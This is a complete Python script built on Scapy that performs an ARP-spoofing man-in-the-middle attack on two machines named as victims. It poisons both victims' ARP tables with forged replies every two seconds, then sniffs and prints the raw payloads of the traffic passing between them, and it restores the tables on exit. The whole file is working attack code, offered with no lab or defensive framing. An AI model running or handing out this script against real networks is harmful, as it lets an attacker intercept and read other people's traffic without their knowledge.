import sys
import time
import signal
from threading import Thread
from scapy.all import ARP, Ether, srp, sendp, sniff, conf, get_if_hwaddr, IP, Raw

# Interface used by the attacker
ATTACKER_INTERFACE = "eth0"
conf.verb = 0

# Global variables to store IP and MAC addresses
victim1_ip = ""
victim2_ip = ""
victim1_mac = ""
victim2_mac = ""
attacker_mac = ""


def get_mac(ip_address):
    """Send an ARP request to find the MAC address for a given IP"""
    print(f"[*] Resolving MAC for {ip_address}...")
    packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
    answered, _ = srp(packet, timeout=2,
                      iface=ATTACKER_INTERFACE, verbose=False)
    if answered:
        return answered[0][1].hwsrc  # Return MAC from the reply
    print(f"[!] Failed to resolve MAC for {ip_address}")
    return None


def spoof_arp(target_ip, target_mac, spoof_ip):
    """Send spoofed ARP reply to target, pretending to be spoof_ip"""
    packet = Ether(dst=target_mac, src=attacker_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac,
        psrc=spoof_ip, hwsrc=attacker_mac
    )
    sendp(packet, iface=ATTACKER_INTERFACE, verbose=False)


def restore_arp():
    """Send correct ARP replies to restore the original ARP table entries of both victims"""
    print("[*] Restoring ARP tables...")
    pkt1 = Ether(dst=victim1_mac, src=victim2_mac) / ARP(
        op=2, pdst=victim1_ip, hwdst=victim1_mac,
        psrc=victim2_ip, hwsrc=victim2_mac
    )
    pkt2 = Ether(dst=victim2_mac, src=victim1_mac) / ARP(
        op=2, pdst=victim2_ip, hwdst=victim2_mac,
        psrc=victim1_ip, hwsrc=victim1_mac
    )
    # Send each packet multiple times to ensure delivery
    sendp(pkt1, iface=ATTACKER_INTERFACE, count=3, verbose=False)
    sendp(pkt2, iface=ATTACKER_INTERFACE, count=3, verbose=False)
    print("[*] ARP tables restored.")


def sniff_packets():
    """Monitor and print IP traffic between the two victims"""
    def callback(pkt):
        if pkt.haslayer(IP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            # Only show traffic between the two victims
            if (src == victim1_ip and dst == victim2_ip) or (src == victim2_ip and dst == victim1_ip):
                payload = pkt[Raw].load if pkt.haslayer(Raw) else b''
                print(f"Received traffic from {src} to {dst}: {payload!r}")
    print("[*] Starting packet sniffing...")
    sniff(iface=ATTACKER_INTERFACE, prn=callback, store=0)


def main():
    global victim1_ip, victim2_ip, victim1_mac, victim2_mac, attacker_mac

    # Check for correct usage
    if len(sys.argv) != 3:
        print(f"Usage: python3 {sys.argv[0]} <victim1_ip> <victim2_ip>")
        sys.exit(1)

    # Print victim IPs
    victim1_ip = sys.argv[1]
    victim2_ip = sys.argv[2]

    # Get MAC addresses
    attacker_mac = get_if_hwaddr(ATTACKER_INTERFACE)
    victim1_mac = get_mac(victim1_ip)
    victim2_mac = get_mac(victim2_ip)

    if not victim1_mac or not victim2_mac:
        print("[!] Failed to obtain victim MAC addresses. Exiting.")
        sys.exit(1)

    print(f"[+] Attacker MAC: {attacker_mac}")
    print(f"[+] Victim 1: {victim1_ip} → {victim1_mac}")
    print(f"[+] Victim 2: {victim2_ip} → {victim2_mac}")

    # Handle Ctrl+C interrupt
    def handle_exit(sig, frame):
        print("\n[!] Ctrl+C received. Cleaning up...")

        # Restore ARP tables
        restore_arp()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_exit)

    # Start background thread for packet sniffing
    sniff_thread = Thread(target=sniff_packets, daemon=True)
    sniff_thread.start()

    print("[*] Starting ARP spoofing... Press Ctrl+C to stop.")
    try:
        while True:
            spoof_arp(victim1_ip, victim1_mac, victim2_ip)
            spoof_arp(victim2_ip, victim2_mac, victim1_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        handle_exit(None, None)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"[!] Error: {e}")
        restore_arp()
